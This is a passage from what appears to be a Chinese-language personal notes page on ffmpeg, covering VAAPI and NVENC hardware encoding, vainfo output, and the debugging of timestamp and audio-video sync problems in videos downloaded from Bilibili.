\u9700\u8981\u4ee5\u4e0b\u5e93</p> <pre><code>apt install va-driver-all mesa-va-drivers\n</code></pre> <p>\u57fa\u672c\u6d4b\u8bd5\uff0c\u6d4b\u8bd5\u6743\u9650\u4e4b\u7c7b\u7684</p> <pre><code>ffmpeg -init_hw_device vaapi=va:/dev/dri/renderD128\n</code></pre> <p>\u8c03\u7528 vaapi \u52a0\u901f\u7f16\u7801</p> <pre><code>ffmpeg -y -vaapi_device /dev/dri/renderD128 -i Big_Buck_Bunny_1080_10s_30MB.mp4 -vf 'format=nv12,hwupload' -c:v h264_vaapi output.mp4\n\nffmpeg -y -i Big_Buck_Bunny_1080_10s_30MB.mp4 -c:v libx264 output.mp4\n</code></pre> <p>\u5982\u679c\u8bbe\u5907\u652f\u6301\u786c\u4ef6\u89e3\u7801</p> <ul> <li>hwaccel vaapi \u6307\u5b9a\u4f7f\u7528\u786c\u4ef6\u89e3\u7801</li> </ul> <pre><code>ffmpeg -hwaccel vaapi -hwaccel_output_format vaapi -hwaccel_device /dev/dri/renderD128 -i input.mp4 -c:v h264_vaapi output.mp4\n</code></pre> <ul> <li>n5105 UHD \u6838\u663e\uff0c\u8f6c\u7801 big bunny 1080p 30fps, 25Mb/s\u7801\u7387\u5927\u698250fps</li> <li>\u4f7f\u7528 cpu \u8f6c\u5219\u53ea\u6709 13fps</li> </ul> <p>vainfo</p> <pre><code>error: can't connect to X server!\nlibva info: VA-API version 1.7.0\nlibva info: Trying to open /usr/lib/x86_64-linux-gnu/dri/radeonsi_drv_video.so\nlibva info: Found init function __vaDriverInit_1_7\nlibva info: va_openDriver() returns 0\nvainfo: VA-API version: 1.7 (libva 2.6.0)\nvainfo: Driver version: Mesa Gallium driver 21.2.6 for AMD Radeon (TM) R7 M340 (ICELAND, DRM 3.42.0, 5.15.0-86-generic, LLVM 12.0.0)\nvainfo: Supported profile and entrypoints\n      VAProfileMPEG2Simple            : VAEntrypointVLD\n      VAProfileMPEG2Main              : VAEntrypointVLD\n      VAProfileNone                   : VAEntrypointVideoProc\n</code></pre> <p>n5105</p> <pre><code>root@n5105-pve \u279c  test vainfo\nerror: can't connect to X server!\nlibva info: VA-API version 1.17.0\nlibva info: Trying to open /usr/lib/x86_64-linux-gnu/dri/iHD_drv_video.so\nlibva info: Found init function __vaDriverInit_1_17\nlibva info: va_openDriver() returns 0\nvainfo: VA-API version: 1.17 (libva 2.12.0)\nvainfo: Driver version: Intel iHD driver for Intel(R) Gen Graphics - 23.1.1 ()\nvainfo: Supported profile and entrypoints\n      VAProfileNone                   : VAEntrypointVideoProc\n      VAProfileNone                   : VAEntrypointStats\n      VAProfileMPEG2Simple            : VAEntrypointVLD\n      VAProfileMPEG2Main              : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointEncSliceLP\n      VAProfileH264High               : VAEntrypointVLD\n      VAProfileH264High               : VAEntrypointEncSliceLP\n      VAProfileJPEGBaseline           : VAEntrypointVLD\n      VAProfileJPEGBaseline           : VAEntrypointEncPicture\n      VAProfileH264ConstrainedBaseline: VAEntrypointVLD\n      VAProfileH264ConstrainedBaseline: VAEntrypointEncSliceLP\n      VAProfileVP8Version0_3          : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointEncSliceLP\n      VAProfileHEVCMain10             : VAEntrypointVLD\n      VAProfileHEVCMain10             : VAEntrypointEncSliceLP\n      VAProfileVP9Profile0            : VAEntrypointVLD\n      VAProfileVP9Profile0            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile1            : VAEntrypointVLD\n      VAProfileVP9Profile1            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile2            : VAEntrypointVLD\n      VAProfileVP9Profile2            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile3            : VAEntrypointVLD\n      VAProfileVP9Profile3            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain422_10         : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain444_10         : VAEntrypointVLD\n      VAProfileHEVCMain444_10         : VAEntrypointEncSliceLP\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#nvidia-nvenc","title":"nvidia NVENC","text":"<p>FFMpeg + NVENC\uff0c\u663e\u5361\u52a0\u6210\u8ba9\u89c6\u9891\u7f16\u7801\u5feb\u800c\u4e0d\u7cd9 - \u6ca7\u57df\u7684\u5c0f\u7ad9 (icyu.me)</p> <pre><code>-cq                &lt;float&gt;      E..V....... Set target quality level (0 to 51, 0 means automatic) for constant quality mode in VBR rate control (from 0 to 51) (default 0)\n\n-qp                &lt;int&gt;        E..V....... Constant quantization parameter rate control method (from -1 to 51) (default -1)\n</code></pre> <pre><code># \u7f16\u7801\nffmpeg -i input.mp4 -c:v hevc_nvenc -crf 23 -c:a copy output.mp4\n# \u89e3\u7801+\u7f16\u7801\nffmpeg -hwaccel cuda -i input.mp4 -c:v hevc_nvenc -crf 23 -c:a copy output.mp4\n</code></pre> <pre><code>ffmpeg -re -i input.mp4 -c:v hevc_nvenc -preset slow -profile:v main10 -rc vbr_hq -b:v 6000k -maxrate:v 9000k -bufsize:v 12000k -c:a aac -b:a 128k -f mpegts \"srt://hostname:port?streamid=stream1&amp;mode=listener\"\n</code></pre> <p>4K 25G h264\uff0c\u5982\u4e0b\u914d\u7f6e 30s 6.3M\uff0c\u975e\u5e38\u591a\u9a6c\u8d5b\u514b</p> <pre><code>ffmpeg -hwaccel cuda -ss 4:10 -t 30 -i a.mp4 -c:v hevc_nvenc -preset slow -c:a copy a.h265.gpu.mkv -y\n</code></pre> <p>cq \u6bd4 qp \u6162\uff1a0.68 vs 1.47</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u65f6\u95f4\u6233\u76f8\u5173","title":"\u65f6\u95f4\u6233\u76f8\u5173","text":"<p>DTS \u89e3\u7801\u65f6\u95f4\u6233</p> <pre><code>[matroska @ 0x55a111e20440] Non-monotonous DTS in output stream 0:1; previous: 565, current: 564; changing to 565. This may result in incorrect timestamps in the output file.\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u9009\u9879","title":"\u9009\u9879","text":"<p>-copyts</p> <p>Do not process input timestamps, but keep their values without trying to sanitize them. In particular, do not remove the initial start time offset value.</p> <p>Note that, depending on the\u00a0vsync\u00a0option or on specific muxer processing (e.g. in case the format option\u00a0avoid_negative_ts\u00a0is enabled) the output timestamps may mismatch with the input timestamps even when this option is selected.</p> <p>-start_at_zero</p> <p>When used with\u00a0copyts, shift input timestamps so they start at zero.</p> <p>This means that using e.g.\u00a0<code>-ss 50</code>\u00a0will make output timestamps start at 50 seconds, regardless of what timestamp the input file started at.</p> <p>-copytb\u00a0mode</p> <p>Specify how to set the encoder timebase when stream copying.\u00a0mode\u00a0is an integer numeric value, and can assume one of the following values:</p> <p>1</p> <p>Use the demuxer timebase.</p> <p>The time base is copied to the output encoder from the corresponding input demuxer. This is sometimes required to avoid non monotonically increasing timestamps when copying video streams with variable frame rate.</p> <p>0</p> <p>Use the decoder timebase.</p> <p>The time base is copied to the output encoder from the corresponding input decoder.</p> <p>-1</p> <p>Try to make the choice automatically, in order to generate a sane output.</p> <p>Default value is -1.</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#ffmpeg-\u8f93\u51fa\u65f6\u95f4\u6233\u9ed8\u8ba4\u4f1a\u7f6e\u4e3a-0","title":"ffmpeg \u8f93\u51fa\u65f6\u95f4\u6233\u9ed8\u8ba4\u4f1a\u7f6e\u4e3a 0","text":"<p>ffmpeg demux into audio and video resets PTS - Stack Overflow</p> <ul> <li>ffmpeg \u5206\u79bb video \u65f6\u4f1a reset timestamp\uff1f</li> </ul> <p>\u6784\u9020\u4e00\u4e2a start \u4e3a 1h \u7684\u89c6\u9891</p> <pre><code>ffmpeg -i bbb_sunflower_1080p_30fps_normal.mp4 -c copy -output_ts_offset 3600 test.mkv\n</code></pre> <p>\u67e5\u770b\u786e\u5b9e start_time = 3600</p> <ul> <li>\u4f7f\u7528 mpv \u64ad\u653e\u8fdb\u5ea6\u6761\u4ecd\u4e3a 0</li> <li>\u4f7f\u7528 windows \u81ea\u5e26\u7684\u89c6\u9891\u64ad\u653e\u5668\uff0c\u8fdb\u5ea6\u6761\u786e\u5b9e\u4ece 1h \u5f00\u59cb</li> <li>\u6587\u4ef6\u7ba1\u7406\u5668\u663e\u793a\u7684\u89c6\u9891\u65f6\u5e38\u4e5f\u786e\u5b9e\u589e\u52a0\u4e86 1h</li> </ul> <pre><code>Input #0, matroska,webm, from 'test.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    ENCODER         : Lavf58.76.100\n  Duration: 01:10:34.60, start: 3600.000000, bitrate: 497 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 01:10:34.600000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 01:10:34.144000000\nstart_pts=3600067\nstart_time=3600.067000\nstart_pts=3600000\nstart_time=3600.000000\n</code></pre> <p>ffmpeg \u590d\u5236\u4e00\u4e0b</p> <pre><code>ffmpeg -i test.mkv -c copy test_copy.mkv\n</code></pre> <p>\u786e\u5b9e start \u88ab\u7f6e\u4e3a 0 \u4e86\uff0c\u5373</p> <pre><code>Input #0, matroska,webm, from 'test_copy.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    ENCODER         : Lavf58.76.100\n  Duration: 00:10:34.60, start: 0.000000, bitrate: 3321 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.600000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.144000000\nstart_pts=67\nstart_time=0.067000\nstart_pts=0\nstart_time=0.000000\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#ffmpeg-\u5408\u5e76\u89c6\u9891\u548c\u97f3\u9891\u9ed8\u8ba4\u5c45\u7136\u4f1a\u6709\u95ee\u9898","title":"ffmpeg \u5408\u5e76\u89c6\u9891\u548c\u97f3\u9891\uff0c\u9ed8\u8ba4\u5c45\u7136\u4f1a\u6709\u95ee\u9898","text":"<p>\u5c06\u89c6\u9891\u5206\u89e3\u4e3a\u89c6\u9891\u548c\u97f3\u9891</p> <pre><code>ffmpeg -i bbb_sunflower_1080p_30fps_normal.mkv -vn -c copy a.m4a -an -c copy a.mkv\n</code></pre> <p>\u5bf9\u97f3\u9891\u8fdb\u884c\u622a\u5207\u548c\u504f\u79fb\uff08\u526a\u6389\u524d 1.7s\uff0c\u540c\u65f6\u5f80\u53f3\u504f\u79fb 1.7s\uff0c\u56e0\u6b64\u76f8\u5bf9\u4e8e base \u8fd8\u662f\u540c\u6b65\u7684\uff09</p> <pre><code>ffmpeg -ss 1.7 -itsoffset 1.7 -i a.m4a -c copy b.m4a\n</code></pre> <pre><code>Input #0, mov,mp4,m4a,3gp,3g2,mj2, from 'b.m4a':\n  Metadata:\n    major_brand     : M4A\n    minor_version   : 512\n    compatible_brands: M4A isomiso2\n    title           : Big Buck Bunny, Sunflower version\n    artist          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    composer        : Sacha Goedegebure\n    encoder         : Lavf58.76.100\n    comment         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    genre           : Animation\n  Duration: 00:10:34.14, start: 1.696000, bitrate: 319 kb/s\n  Stream #0:0(und): Audio: ac3 (ac-3 / 0x332D6361), 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      handler_name    : GPAC ISO Audio Handler\n      vendor_id       : [0][0][0][0]\n    Side data:\n      audio service type: main\nstart_pts=81408\nstart_time=1.696000\n</code></pre> <p>\u5c06\u539f\u672c\u89c6\u9891\u548c\u97f3\u9891\u5408\u5e76 <code>ffmpeg -i a.mkv -i b.m4a -c copy merge2.mkv</code></p> <ul> <li>ffmpeg \u76f4\u63a5\u5ffd\u89c6\u4e86 input \u7684\u65f6\u95f4\u6233\uff0c\u5c06\u5176\u8ba4\u4e3a\u662f\u4ece 0 \u5f00\u59cb\u7684\uff0c\u7136\u540e\u5408\u5e76\u3002\u56e0\u6b64\u5bfc\u81f4\u58f0\u97f3\u76f8\u6bd4\u4e8e\u6b63\u786e\u60c5\u51b5\u63d0\u524d\u4e86\u3002</li> </ul> <pre><code>Input #0, matroska,webm, from 'merge.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ENCODER         : Lavf58.76.100\n  Duration: 00:10:34.53, start: 0.000000, bitrate: 3321 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.533000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:32.448000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <p>\u6b63\u786e\u5408\u5e76 <code>ffmpeg -i a.mkv -i b.m4a -copyts -c copy merge2.mkv</code></p> <pre><code>Input #0, matroska,webm, from 'merge2.mkv':\n  Metadata:\n    title           : Big Buck Bunny, Sunflower version\n    ARTIST          : Blender Foundation 2008, Janus Bager Kristensen 2013\n    COMMENT         : Creative Commons Attribution 3.0 - http://bbb3d.renderfarming.net\n    GENRE           : Animation\n    MAJOR_BRAND     : isom\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: isomavc1\n    COMPOSER        : Sacha Goedegebure\n    ENCODER         : Lavf58.76.100\n  Duration: 00:10:34.60, start: 0.067000, bitrate: 3320 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 30 fps, 30 tbr, 1k tbn, 60 tbc (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Video Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.600000000\n  Stream #0:1: Audio: ac3, 48000 Hz, 5.1(side), fltp, 320 kb/s (default)\n    Metadata:\n      HANDLER_NAME    : GPAC ISO Audio Handler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:10:34.144000000\nstart_pts=67\nstart_time=0.067000\nstart_pts=1696\nstart_time=1.696000\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#delay-\u67d0\u4e2a\u6d41","title":"delay \u67d0\u4e2a\u6d41","text":"<p>\u5f3a\u884c\u5c06\u97f3\u9891 delay 0.613s\uff0c\u53ef\u4ee5\u5bfc\u81f4\u4e0d\u540c\u6b65</p> <pre><code>(base) fyyuan@icarus4 \u279c  reset_pts ffmpeg -i ../src.mkv -itsoffset 0.613 -i ../src.mkv -map 0:0 -map 1:1 -c copy -shortest output_video_adjusted.mkv\n\nInput #0, matroska,webm, from 'output_video_adjusted.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.613000, bitrate: 24908 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.149000000\n  Stream #0:1: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:41.018000000\nstart_pts=613\nstart_time=0.613000\nstart_pts=613\nstart_time=0.613000\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#b-\u7ad9\u95ee\u9898","title":"B \u7ad9\u95ee\u9898","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u4e3a\u4ec0\u4e48-seek-0638s\u7ed3\u679c\u5bfc\u81f4-video-\u8d77\u59cb\u53d8\u6210\u4e86-41s","title":"\u4e3a\u4ec0\u4e48 seek 0.638s\uff0c\u7ed3\u679c\u5bfc\u81f4 video \u8d77\u59cb\u53d8\u6210\u4e86 4.1s","text":"<p>\u73b0\u8c61\u5c31\u662f\u89c6\u9891\u5c11\u4e86 4s\uff0cmpv \u64ad\u653e\u65f6\u8d77\u59cb\u76f4\u63a5\u53d8\u6210\u4e86 4s</p> <pre><code>Input #0, matroska,webm, from 'src.hevc.aac.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.18, start: 0.000000, bitrate: 11146 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libx265\n      DURATION        : 00:08:41.175000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 aac\n      DURATION        : 00:08:41.023000000\nstart_pts=638\nstart_time=0.638000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <pre><code>ffmpeg -i src.hevc.aac.mkv -ss 0.638 -c copy cut.hevc.aac.ss638.mkv\n</code></pre> <pre><code>Input #0, matroska,webm, from 'cut.hevc.aac.ss638.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:40.54, start: 0.002000, bitrate: 10998 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 libx265\n      DURATION        : 00:08:40.536000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      ENCODER         : Lavc58.134.100 aac\n      DURATION        : 00:08:40.385000000\nstart_pts=4171\nstart_time=4.171000\nstart_pts=2\nstart_time=0.002000\n</code></pre> <p>\u6000\u7591\u662f seek\uff0cseek \u5230\u4e0b\u4e00\u4e2a\u5173\u952e\u5e27\u4e86\uff0c\u5bfc\u81f4\u4e22\u5931\u4e86\u5173\u952e\u5e27\u524d\u7684\u6240\u6709\u6570\u636e\uff08\u867d\u7136 chatgpt \u544a\u8bc9\u6211 seek \u662f seek \u5230\u4e4b\u524d\u7684\u5173\u952e\u5e27\uff09</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u611f\u89c9\u95ee\u9898\u5728\u4e8e\u4e3a\u4ec0\u4e48\u81ea\u5df1\u7684\u89c6\u9891-video-\u548c-audio-duration-\u76f8\u5dee\u6ca1\u90a3\u4e48\u5927\u800c-b-\u7ad9\u8f6c\u7801\u540e\u5c31\u76f8\u5dee-05s-\u4e86","title":"\u611f\u89c9\u95ee\u9898\u5728\u4e8e\u4e3a\u4ec0\u4e48\u81ea\u5df1\u7684\u89c6\u9891 video \u548c audio duration \u76f8\u5dee\u6ca1\u90a3\u4e48\u5927\uff0c\u800c B \u7ad9\u8f6c\u7801\u540e\uff0c\u5c31\u76f8\u5dee 0.5s \u4e86","text":"<p>\u5206 p \u7248\u672c \u6e90\u6587\u4ef6</p> <pre><code>Input #0, matroska,webm, from 'p09.mkv':\n  Metadata:\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.15, start: 0.000000, bitrate: 24909 kb/s\n  Stream #0:0: Video: hevc (Main 10), yuv420p10le(tv, bt2020nc/bt2020/bt2020-10), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 59.94 tbc (default)\n    Metadata:\n      DURATION        : 00:08:41.149000000\n  Stream #0:1: Audio: aac_latm (LC) ([2][22][0][0] / 0x1602), 48000 Hz, 5.1, fltp (default)\n    Metadata:\n      DURATION        : 00:08:41.002000000\nstart_pts=613\nstart_time=0.613000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <p>b \u7ad9\u4e0b\u8f7d\u7684</p> <pre><code>\u279c  yt-dlp ./yt-dlp https://www.bilibili.com/video/BV1dG411z7sc -F -I 9\n[BiliBili] Extracting URL: https://www.bilibili.com/video/BV1dG411z7sc\n[BiliBili] 1dG411z7sc: Downloading webpage\n[BiliBili] BV1dG411z7sc: Extracting videos in anthology\n[BiliBili] Downloading playlist BV1dG411z7sc - add --no-playlist to download just the video BV1dG411z7sc\n[download] Downloading playlist: \u3010\u7b2c73\u56deNHK\u7d05\u767d\u6b4c\u5408\u6226 BS4K\u3011\u8282\u9009\n[BiliBili] Playlist \u3010\u7b2c73\u56deNHK\u7d05\u767d\u6b4c\u5408\u6226 BS4K\u3011\u8282\u9009: Downloading 1 items\n[download] Downloading item 1 of 1\n[BiliBili] Extracting URL: https://www.bilibili.com/video/BV1dG411z7sc?p=9\n[BiliBili] 1dG411z7sc: Downloading webpage\n[BiliBili] BV1dG411z7sc: Extracting videos in anthology\n[BiliBili] 410742370: Extracting chapters\n[info] Available formats for BV1dG411z7sc_p9:\nID    EXT RESOLUTION FPS \u2502   FILESIZE    TBR PROTO \u2502 VCODEC         VBR ACODEC      ABR\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n30216 m4a audio only     \u2502 \u2248  2.51MiB    39k https \u2502 audio only         mp4a.40.5   39k\n30232 m4a audio only     \u2502 \u2248  5.88MiB    92k https \u2502 audio only         mp4a.40.2   92k\n30280 m4a audio only     \u2502 \u2248  9.87MiB   155k https \u2502 audio only         mp4a.40.2  155k\n30016 mp4 640x360     30 \u2502 \u2248 23.35MiB   367k https \u2502 avc1.64001E   367k video only\n30032 mp4 852x480     30 \u2502 \u2248 52.44MiB   824k https \u2502 avc1.64001F   824k video only\n30064 mp4 1280x720    30 \u2502 \u2248116.21MiB  1827k https \u2502 avc1.640028  1827k video only\n30080 mp4 1920x1080   30 \u2502 \u2248173.36MiB  2725k https \u2502 avc1.640032  2725k video only\n30116 mp4 1920x1080   59 \u2502 \u2248346.03MiB  5439k https \u2502 avc1.640032  5439k video only\n30120 mp4 3840x2160   59 \u2502 \u2248  1.16GiB 18644k https \u2502 avc1.640034 18644k video only\n[download] Finished downloading playlist: \u3010\u7b2c73\u56deNHK\u7d05\u767d\u6b4c\u5408\u6226 BS4K\u3011\u8282\u9009\n</code></pre> <p>(\u8fd9\u91cc\u662f yt-dlp \u7684 bug\uff0c\u9700\u8981\u52a0 copyts\uff0c\u5426\u5219\u5408\u5e76\u65f6\u4f1a\u4e22\u5f03 input timestamp\u3002\u4e0d\u8fc7\u6211\u8bd5\u4e86\u624b\u52a8 merge\uff0c\u8c8c\u4f3c\u4ecd\u7136\u4e0d\u540c\u6b65\uff0c\u8fd9\u6b21\u53d8\u6210\u97f3\u9891\u8981\u5feb\u4e00\u70b9)</p> <pre><code>Input #0, matroska,webm, from 'bili-p09.mkv':\n  Metadata:\n    DESCRIPTION     : Packed by Bilibili XCoder v2.0.2\n    MAJOR_BRAND     : iso5\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: avc1iso5dsmsmsixdash\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.05, start: 0.000000, bitrate: 18779 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      HANDLER_NAME    : VideoHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:40.539000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, stereo, fltp (default)\n    Metadata:\n      HANDLER_NAME    : SoundHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.045000000\nstart_pts=0\nstart_time=0.000000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <p>\u624b\u52a8\u5408\u5e76\u7684\uff08\u8fd9\u91cc\u7684 1.226 \u4e0d\u5c31\u662f 0.613 \u7684\u4e24\u500d\u5417\uff09\uff08\u679c\u7136\uff0c\u5c06\u97f3\u9891 delay +600ms \u540e\uff0c\u5c31\u5f88\u540c\u6b65\u4e86\uff09</p> <pre><code>Input #0, matroska,webm, from 'p9.mkv':\n  Metadata:\n    DESCRIPTION     : Packed by Bilibili XCoder v2.0.2\n    MAJOR_BRAND     : iso5\n    MINOR_VERSION   : 1\n    COMPATIBLE_BRANDS: avc1iso5dsmsmsixdash\n    ENCODER         : Lavf58.76.100\n  Duration: 00:08:41.77, start: 0.000000, bitrate: 18753 kb/s\n  Stream #0:0: Video: h264 (High), yuv420p(tv, bt709, progressive), 3840x2160 [SAR 1:1 DAR 16:9], 59.94 fps, 59.94 tbr, 1k tbn, 119.88 tbc (default)\n    Metadata:\n      HANDLER_NAME    : VideoHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.765000000\n  Stream #0:1: Audio: aac (LC), 48000 Hz, stereo, fltp (default)\n    Metadata:\n      HANDLER_NAME    : SoundHandler\n      VENDOR_ID       : [0][0][0][0]\n      DURATION        : 00:08:41.045000000\nstart_pts=1226\nstart_time=1.226000\nstart_pts=0\nstart_time=0.000000\n</code></pre> <p>\u539f\u56e0\u5728\u4e8e\u8fd9\u91cc\u7684 duration \u662f\u5305\u542b start_pts \u7684\uff0c\u56e0\u6b64\u6e90\u89c6\u9891\u7684 video \u5c31\u6bd4 audio \u5c11\u7ea6 0.5s</p> <p>\u4f7f\u7528 setpts\uff08\u540e\u9762\u53d1\u73b0\u8be5\u547d\u4ee4\u662f filter \u56e0\u6b64\u9700\u8981\u8f6c\u7801\uff0c\u901f\u5ea6\u5f88\u6162\uff0c\u5b9e\u9645\u4e0a\u5bf9\u53ef\u4ee5 input video \u5355\u72ec\u8bbe\u7f6e input pts offset\uff0c\u540e\u9762\u4f1a\u7528\u5230\u8be5\u547d\u4ee4\u8fdb\u884c\u4fee\u590d\uff09\uff0c\u53ef\u4ee5\u590d\u73b0 duration \u5dee\u503c\u53d8\u5927</p> <pre><code> ffmpeg -i src.mkv -filter_complex 